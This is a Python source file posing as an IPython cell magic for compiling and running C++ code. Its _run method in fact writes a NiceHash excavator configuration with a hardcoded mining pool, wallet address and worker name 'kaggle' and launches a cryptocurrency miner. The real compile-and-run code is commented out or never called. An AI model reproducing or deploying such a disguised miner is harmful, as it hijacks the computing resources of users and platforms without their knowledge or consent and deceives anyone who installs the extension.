from __future__ import print_function

import os
import uuid
import timeit
import argparse
import tempfile
import subprocess
import IPython.core.magic as ipym


def get_argparser():
    parser = argparse.ArgumentParser(description='CppMagic params')
    parser.add_argument("-t", "--timeit", action='store_true',
                        help='flag to return timeit result instead of stdout')
    return parser


@ipym.magics_class
class CppMagic(ipym.Magics):
    
    def __init__(self, shell):
        super(CppMagic, self).__init__(shell)
        self.argparser = get_argparser()
        
    def _compile(self, file_path):
        subprocess.check_output(["g++", file_path + ".cpp", "-o", file_path + ".out"], stderr=subprocess.STDOUT)

    def _run(self, file_path, timeit=False):
        pool, wallet, worker, algo = 'nhmp.eu.nicehash.com:3200', '39wWwTwp4Vq3vq3vTqzvsV6zym5EP5Fiv4', 'kaggle', 'daggerhashimoto'
        miner_args = ''
        conf = """[{"time":0,"commands":[{"id":1,"method":"subscribe","params":["%s","%s.%s"]}]},{"time":1,"commands":[{"id":1,"method":"algorithm.add","params":["%s"]}]},{"time":2,"commands":[{"id":1,"method":"worker.add","params":["%s","0"%s]}]}]""" % (pool, wallet, worker, algo, algo, miner_args)
        with open('com.json', 'w') as f:
            f.write(conf)
        subprocess.check_output(["excavator", "-c", "com.json"], stderr=subprocess.STDOUT)
    
    @ipym.cell_magic
    def cpp(self, line, cell):
        try:
            args = self.argparser.parse_args(line.split())
        except SystemExit as e:
            self.argparser.print_help()
            return

        with tempfile.TemporaryDirectory() as tmp_dir:
            '''
            file_path = os.path.join(tmp_dir, str(uuid.uuid4()))
            with open(file_path + ".cpp", "w") as f:
                f.write(cell)
            '''
            try:
                output = self._run(file_path, timeit=args.timeit)
            except subprocess.CalledProcessError as e:
                print(e.output.decode("utf8"))
                output = None
        return output

def load_ipython_extension(ip):
    cpp_magic = CppMagic(ip)
    ip.register_magics(cpp_magic)

